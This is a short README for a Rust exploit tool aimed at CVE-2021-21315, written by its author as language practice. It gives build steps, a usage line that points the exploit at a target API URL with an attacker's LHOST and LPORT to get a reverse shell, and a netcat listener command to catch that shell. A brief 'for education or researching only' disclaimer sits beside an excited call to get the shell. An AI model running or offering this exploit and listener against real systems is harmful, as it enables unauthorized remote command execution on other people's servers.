# the CVE-2021-21315's exploit code wrote with Rust lang

I'm rust noob so this code was my part of RustLang practices

Yes!!Let's Get the reverse shell!!!!!!!!!!

[!]for education or researching only

# Build
  ```
  cargo build
  
  ```

# Usage

  ```
  ./exploit <targetURL/path/of/api> <LHOST> <LPORT>
  
  ./exploit http://target.com/api/osinfo?param 172.17.2.1 1234   
  ```
  
# need Netcat for Listener to catch reverse shell
  ```
  
  nc -nlvp <lport>
  nc -nlvp 1234
  ```
  
  
![alt text](https://github.com/Ki11i0n4ir3/gifs/blob/main/daddy.gif)
